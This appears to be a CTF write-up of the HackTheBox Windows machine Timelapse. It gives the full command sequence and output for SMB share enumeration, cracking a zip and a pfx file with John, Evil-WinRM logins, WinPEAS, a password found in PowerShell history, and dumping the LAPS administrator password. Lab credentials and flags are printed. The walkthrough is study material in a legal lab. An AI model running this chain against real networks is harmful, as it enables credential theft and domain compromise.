---
title: "Walk-through of Timelapse from HackTheBox"
header:
  teaser: /assets/images/2022-04-09-21-50-59.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Windows
  - SMBMap
  - SMBClient
  - WinPEAS
  - Evil-WinRM
---

## Machine Information

![timelapse](/assets/images/2022-04-09-21-50-59.png)

Timelapse is rated as an easy machine on HackTheBox. This Windows box has many ports open but our time is spent mostly on port 445 with SMB and 5986 with WinRM. With SMBClient we find a couple of open shares, from there we retrieve a backup file. After cracking the zip and then the pfx file within it we use Evil-WinRM to get a remote connection. WinPEAS helps us find a file with credentials. Swapping to that new user we dump a LAPS password for the administrator and complete the box.

<!--more-->

Skills required are mostly around enumeration of shares and the Windows file system. Skills learned are converting and cracking different file types, using Evil-WinRM and LAPS.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Timelapse](https://www.hackthebox.com/home/machines/profile/452) |
| Machine Release Date | 26th March 2022 |
| Date I Completed It | 10th April 2022 |
| Distribution Used | Kali 2021.4 – [Release Info](https://www.kali.org/blog/kali-linux-2021-4-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/timelapse]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.152 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/timelapse]
└─# nmap -p$ports -sC -sV -oA timelapse 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-09 22:14 BST
Nmap scan report for 10.10.11.152
Host is up (0.64s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-10 05:14:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0.)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0.)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2022-04-10T05:16:29+00:00; +8h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
57113/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2022-04-10T05:15:55
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.91 seconds
```

## SMBCLient

It's a Windows box with port 445 open, let's have a look for shares:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# smbclient -L 10.10.11.152
Enter WORKGROUP\roots password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share
```

## SMBMap

We can see an open share, instead of looking around manually you can use smbmap to list everything we have access to:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# smbmap -H 10.10.11.152 -u guest -R
[+] IP: 10.10.11.152:445        Name: 10.10.11.152                                      
        Disk                                                Permissions     Comment
        ----                                                -----------     -------
        <SNIP>
        Shares                                              READ ONLY
        .\Shares\*
        dr--r--r--            0 Mon Oct 25 20:40:06 2021    Dev
        dr--r--r--            0 Mon Oct 25 16:55:14 2021    HelpDesk
        .\Shares\Dev\*
        fr--r--r--         2611 Mon Oct 25 22:05:30 2021    winrm_backup.zip
        .\Shares\HelpDesk\*
        fr--r--r--      1118208 Mon Oct 25 16:55:14 2021    LAPS.x64.msi
        fr--r--r--       104422 Mon Oct 25 16:55:14 2021    LAPS_Datasheet.docx
        fr--r--r--       641378 Mon Oct 25 16:55:14 2021    LAPS_OperationsGuide.docx
        fr--r--r--        72683 Mon Oct 25 16:55:14 2021    LAPS_TechnicalSpecification.docx
```

A backup file is usually a good place to look. Let's grab that winrm zip file:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# smbclient \\\\10.10.11.152\\Shares
Enter WORKGROUP\roots password: 
smb: \> cd Dev
smb: \Dev\> dir
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021
                6367231 blocks of size 4096. 1076764 blocks available

smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip
(0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \Dev\> exit
```

Unfortunately we find it's a password protected zip file:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# unzip winrm_backup.zip                               
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

## Zipfile Hash Cracking

Use the zip2john script to create a hash file we can try and crack:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# zip2john winrm_backup.zip > winrm.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

┌──(root💀kali)-[~/htb/timelapse]
└─# cat winrm.hash      
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*884
c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d<SNIP>
82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f9<SNIP>
7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
```

Now we can try to crack with JohnTheRipper and the rockyou wordlist:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:03 DONE (2022-04-09 22:31) 0.2583g/s 897521p/s 897521c/s 897521C/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

It only takes a few seconds to get the password. Let's unzip the file and look inside:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# unzip winrm_backup.zip                                  
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

## PFX file Hash Cracking

We have a pfx file from the archive. If you've not worked with pfx files before, then [this](https://www.howtouselinux.com/post/pfx-file-with-examples) is helpful. The last section explains how to extract a private key from a pfx file. However if we try it we find this also needs a password:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password:
Mac verify error: invalid password?
```

Back to John to crack this one. First convert the pfx file to a John friendly hash:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# pfx2john legacyy_dev_auth.pfx > pfx.hash

┌──(root💀kali)-[~/htb/timelapse]
└─# cat pfx.hash
legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d
668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a082060004
8205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308<SNIP>
23b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx
```

Fire up JohnTheRipper with rockyou again:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash      
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:42 DONE (2022-04-09 22:45) 0.02346g/s 75826p/s 75826c/s 75826C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We have another password in only a few seconds. Let's extract that private key now we have the password:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

For PEM pass phrase you can set this to anything, I used 1234.

We also need the certificate as well as the private key. Use the same password as we got from John again:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt
Enter Import Password:
```

## Evil-WinRM As User Legacyy

Now we have all the files needed to connect using Evil-WinRM:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# evil-winrm -i 10.10.11.152 -c ./pfx.crt -k ./priv.key -p -u -S 
Evil-WinRM shell v3.3
Warning: SSL enabled
Info: Establishing connection to remote endpoint
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

## User Flag

Using the PEM password 1234 we set before and we're now connected. I got the user flag first:

```text
*Evil-WinRM* PS C:\Users\legacyy\Documents> type ..\desktop\user.txt
e9fd75b313ffaa4e72f06e32dffc6f96
```

## WinPEAS

Then I used [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to look for interesting things:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# wget https://github.com/carlospolop/PEASS-ng/releases/download/20220410/winPEAS.bat
--2022-04-10 15:27:11--  https://github.com/carlospolop/PEASS-ng/releases/download/20220410/winPEAS.bat
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/104e6ae6-428a-468d-bf80-431282a92108
--2022-04-10 15:27:11--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/104e6ae6-428a-468d
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 35766 (35K) [application/octet-stream]
Saving to: ‘winPEAS.bat’
winPEAS.bat               100%[====================================================================>]  34.93K  --.-KB/s    in 0.009s  
2022-04-10 15:27:11 (3.65 MB/s) - ‘winPEAS.bat’ saved [35766/35766]
```

We can use our connected session to upload the file:

```text
*Evil-WinRM* PS C:\Users\legacyy\Documents> upload /root/htb/timelapse/winPEAS.bat
Info: Uploading /root/htb/timelapse/winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat
Enter PEM pass phrase:
Data: 47688 bytes of 47688 bytes copied
Info: Upload successful!
```

The bat file runs but the output is a little messy. Even so, looking through we find a number of interesting things:

```text
*Evil-WinRM* PS C:\Users\legacyy\Documents> .\winPEAS.bat

<SNIP>
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd
    AdmPwdEnabled    REG_DWORD    0x1
[i] Active if "1"

<SNIP>
Checking PS history file
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66
 Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
03/04/2022  12:46 AM               434 ConsoleHost_history.txt
               1 File(s)            434 bytes
               0 Dir(s)   6,101,368,832 bytes free
```

The ConsoleHost_history.txt file contains commands run by the user we are connected as:

```text
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

It's one of the many files to check, as noted on the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools) cheat-sheet. From that we have a new user svc_deploy and a password. We also see they looked at all the users in AD, a quick check shows there quite a few:

```text
*Evil-WinRM* PS C:\Users\legacyy\Documents> get-aduser -filter * | select samaccountname
Enter PEM pass phrase:

samaccountname
--------------
Administrator
Guest
krbtgt
thecybergeek
payl0ad
legacyy
sinfulz
babywyrm
svc_deploy
TRX
```

## Evil-WinRM As User SVC_Deploy

I can't do a lot as this current user, lets swap to the svc_deploy account we found:

```sh
*Evil-WinRM* PS C:\Users\legacyy\Documents> exit
Enter PEM pass phrase:
Info: Exiting with code 0

┌──(root💀kali)-[~/htb/timelapse]
└─# evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.3
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

## LAPS

I spent a while looking around with nothing obvious jumping out. Looking back at the WinPEAS output we see it found LAPS is installed in the registry. We also saw at the start on the HelpDesk share there were the LAPS installation docs and file. And then the box name makes sense TimeLapse!

LAPS manages the local admin password, rotating it on a set frequency. [This](https://www.recastsoftware.com/resources/overview-of-microsoft-laps-local-administrator-password-solution/) is a guide to all things LAPS. I also found [this](https://smarthomepursuits.com/export-laps-passwords-powershell/) which was helpful, from that I dumped the LAPS password from AD:

```text
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-adcomputer -filter * -properties ms-mcs-admpwd | select name,ms-mcs-admpwd

name  ms-mcs-admpwd
----  -------------
DC01  1;s(T[,8/k6k8+n1e8Jh+Q@r
DB01
WEB01
DEV01
```

Checking which server we are on we find it's DC01:

```text
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> hostname
dc01
```

## Root Flag

So we have the local administrator password, and we know we're on the DC01 box that it relates to. Let's drop out of this shell, and connect as admin:

```sh
┌──(root💀kali)-[~/htb/timelapse]
└─# evil-winrm -i 10.10.11.152 -u Administrator -p '1;s(T[,8/k6k8+n1e8Jh+Q@r' -S       

Evil-WinRM shell v3.3
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Let's grab the root flag to finish the box:

```text
*Evil-WinRM* PS C:\Users> type trx\desktop\root.txt
3b0e8ff4e0ba0e044abaf52dd07d342d
```

All done. See you next time.
